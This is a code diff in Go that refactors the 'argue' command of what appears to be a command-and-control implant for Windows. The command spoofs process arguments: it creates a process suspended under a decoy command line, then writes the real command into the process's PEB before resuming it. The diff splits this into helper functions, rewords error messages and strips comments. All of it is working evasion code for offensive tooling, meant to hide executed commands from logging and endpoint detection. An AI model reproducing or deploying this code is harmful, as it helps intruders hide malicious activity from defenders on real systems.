@@ -24,7 +24,6 @@ func (c *ArgueCommand) Description() string {
 // RTL_USER_PROCESS_PARAMETERS offsets (x64)
 const (
 	ruppCommandLineOffset = 0x70 // CommandLine UNICODE_STRING
-	ruppImagePathOffset   = 0x60 // ImagePathName UNICODE_STRING
 )
 
 var (
@@ -40,7 +39,7 @@ func (c *ArgueCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if params.Command == "" {
-		return errorResult("Error: command is required")
+		return errorResult("command is required")
 	}
 
 	// If no spoof string provided, use just the executable name
@@ -54,7 +53,7 @@ func (c *ArgueCommand) Execute(task structs.Task) structs.CommandResult {
 		if output != "" {
 			return errorf("%s\nError: %v", output, err)
 		}
-		return errorf("Error: %v", err)
+		return errorf("failed to execute spoofed process for command %q: %v", params.Command, err)
 	}
 
 	trimmed := strings.TrimSpace(output)
@@ -89,14 +88,14 @@ func executeSpoofedProcess(realCmd, spoofCmd string) (string, error) {
 	sa.InheritHandle = 1
 
 	if err := windows.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0); err != nil {
-		return "", fmt.Errorf("CreatePipe: %w", err)
+		return "", fmt.Errorf("pipe creation: %w", err)
 	}
 	defer windows.CloseHandle(stdoutRead)
 
 	// Prevent read handle from being inherited
 	if err := windows.SetHandleInformation(stdoutRead, windows.HANDLE_FLAG_INHERIT, 0); err != nil {
 		windows.CloseHandle(stdoutWrite)
-		return "", fmt.Errorf("SetHandleInformation: %w", err)
+		return "", fmt.Errorf("handle attribute set: %w", err)
 	}
 
 	// Step 1: Create process SUSPENDED with SPOOFED command line
@@ -128,104 +127,88 @@ func executeSpoofedProcess(realCmd, spoofCmd string) (string, error) {
 	)
 	if err != nil {
 		windows.CloseHandle(stdoutWrite)
-		return "", fmt.Errorf("CreateProcess (suspended): %w", err)
+		return "", fmt.Errorf("process creation (suspended): %w", err)
 	}
 
 	defer windows.CloseHandle(pi.Process)
 	defer windows.CloseHandle(pi.Thread)
 
-	// Step 2: Read PEB address via NtQueryInformationProcess
+	if err := arguePatchPEB(pi.Process, realCmd); err != nil {
+		windows.TerminateProcess(pi.Process, 1)
+		windows.CloseHandle(stdoutWrite)
+		return "", err
+	}
+
+	windows.CloseHandle(stdoutWrite)
+	return argueResumeAndCapture(stdoutRead, &pi)
+}
+
+// arguePatchPEB reads the PEB of a suspended process and overwrites the
+// CommandLine UNICODE_STRING buffer with the real command.
+func arguePatchPEB(hProcess windows.Handle, realCmd string) error {
 	var pbi PROCESS_BASIC_INFORMATION
 	var retLen uint32
 	status, _, _ := procNtQueryInformationProcessArg.Call(
-		uintptr(pi.Process),
+		uintptr(hProcess),
 		0, // ProcessBasicInformation
 		uintptr(unsafe.Pointer(&pbi)),
 		uintptr(unsafe.Sizeof(pbi)),
 		uintptr(unsafe.Pointer(&retLen)),
 	)
 	if status != 0 {
-		windows.TerminateProcess(pi.Process, 1)
-		windows.CloseHandle(stdoutWrite)
-		return "", fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%X", status)
+		return fmt.Errorf("process info query: status 0x%X", status)
 	}
 
-	// Step 3: Read ProcessParameters pointer from PEB+0x20
 	var processParamsAddr uintptr
-	err = readProcessMemoryPtr(pi.Process, pbi.PebBaseAddress+pebProcessParametersOffset, &processParamsAddr)
-	if err != nil {
-		windows.TerminateProcess(pi.Process, 1)
-		windows.CloseHandle(stdoutWrite)
-		return "", fmt.Errorf("read PEB.ProcessParameters: %w", err)
+	if err := readProcessMemoryPtr(hProcess, pbi.PebBaseAddress+pebProcessParametersOffset, &processParamsAddr); err != nil {
+		return fmt.Errorf("read process parameters: %w", err)
 	}
 
-	// Step 4: Read CommandLine UNICODE_STRING from ProcessParameters+0x70
-	// UNICODE_STRING layout: Length(2) + MaximumLength(2) + pad(4) + Buffer(8) = 16 bytes
 	cmdLineAddr := processParamsAddr + ruppCommandLineOffset
 	var cmdLineUS [16]byte
 	var bytesRead uintptr
-	err = windows.ReadProcessMemory(pi.Process, cmdLineAddr, &cmdLineUS[0], 16, &bytesRead)
-	if err != nil {
-		windows.TerminateProcess(pi.Process, 1)
-		windows.CloseHandle(stdoutWrite)
-		return "", fmt.Errorf("read CommandLine UNICODE_STRING: %w", err)
+	if err := windows.ReadProcessMemory(hProcess, cmdLineAddr, &cmdLineUS[0], 16, &bytesRead); err != nil {
+		return fmt.Errorf("read CommandLine UNICODE_STRING: %w", err)
 	}
 
 	origBuffer := *(*uintptr)(unsafe.Pointer(&cmdLineUS[8]))
 
-	// Step 5: Encode real command as UTF-16LE
 	realUTF16, err := windows.UTF16FromString(realCmd)
 	if err != nil {
-		windows.TerminateProcess(pi.Process, 1)
-		windows.CloseHandle(stdoutWrite)
-		return "", fmt.Errorf("encode real command: %w", err)
+		return fmt.Errorf("encode real command: %w", err)
 	}
-	// Don't include null terminator in Length, but include it in MaximumLength
 	realLenBytes := uint16((len(realUTF16) - 1) * 2)
 	realMaxBytes := uint16(len(realUTF16) * 2)
 
-	// Step 6: Write real command into the existing PEB buffer
-	// The spoof was padded to be >= real command, so it always fits
-	writeAddr := origBuffer
-
-	// Write the UTF-16 encoded real command
 	realBytes := make([]byte, realMaxBytes)
 	for i, c := range realUTF16 {
 		binary.LittleEndian.PutUint16(realBytes[i*2:], c)
 	}
 	var bytesWritten uintptr
-	err = windows.WriteProcessMemory(pi.Process, writeAddr, &realBytes[0], uintptr(len(realBytes)), &bytesWritten)
-	if err != nil {
-		windows.TerminateProcess(pi.Process, 1)
-		windows.CloseHandle(stdoutWrite)
-		return "", fmt.Errorf("write real command: %w", err)
+	if err := windows.WriteProcessMemory(hProcess, origBuffer, &realBytes[0], uintptr(len(realBytes)), &bytesWritten); err != nil {
+		return fmt.Errorf("write real command: %w", err)
 	}
 
-	// Step 7: Update CommandLine.Length in ProcessParameters
-	// Only update Length (first 2 bytes) — MaximumLength and Buffer stay the same
-	var lenBytes [2]byte
-	binary.LittleEndian.PutUint16(lenBytes[:], realLenBytes)
-	err = windows.WriteProcessMemory(pi.Process, cmdLineAddr, &lenBytes[0], 2, &bytesWritten)
-	if err != nil {
-		windows.TerminateProcess(pi.Process, 1)
-		windows.CloseHandle(stdoutWrite)
-		return "", fmt.Errorf("update CommandLine.Length: %w", err)
+	var lenBuf [2]byte
+	binary.LittleEndian.PutUint16(lenBuf[:], realLenBytes)
+	if err := windows.WriteProcessMemory(hProcess, cmdLineAddr, &lenBuf[0], 2, &bytesWritten); err != nil {
+		return fmt.Errorf("update CommandLine.Length: %w", err)
 	}
+	return nil
+}
 
-	// Step 8: Resume the process
-	windows.CloseHandle(stdoutWrite) // Close write end before reading
-
+// argueResumeAndCapture resumes a suspended process and reads its stdout.
+func argueResumeAndCapture(stdoutRead windows.Handle, pi *windows.ProcessInformation) (string, error) {
 	var suspendCount uint32
-	status, _, _ = procNtResumeThread.Call(
+	status, _, _ := procNtResumeThread.Call(
 		uintptr(pi.Thread),
 		uintptr(unsafe.Pointer(&suspendCount)),
 	)
 	if status != 0 {
 		windows.TerminateProcess(pi.Process, 1)
-		return "", fmt.Errorf("NtResumeThread: NTSTATUS 0x%X", status)
+		return "", fmt.Errorf("thread resume: status 0x%X", status)
 	}
 
-	// Step 9: Read output
 	var output strings.Builder
 	buf := make([]byte, 4096)
 	for {
@@ -241,7 +224,6 @@ func executeSpoofedProcess(realCmd, spoofCmd string) (string, error) {
 		}
 	}
 
-	// Wait for completion (30s timeout)
 	event, _ := windows.WaitForSingleObject(pi.Process, 30000)
 	if event == uint32(windows.WAIT_TIMEOUT) {
 		windows.TerminateProcess(pi.Process, 1)
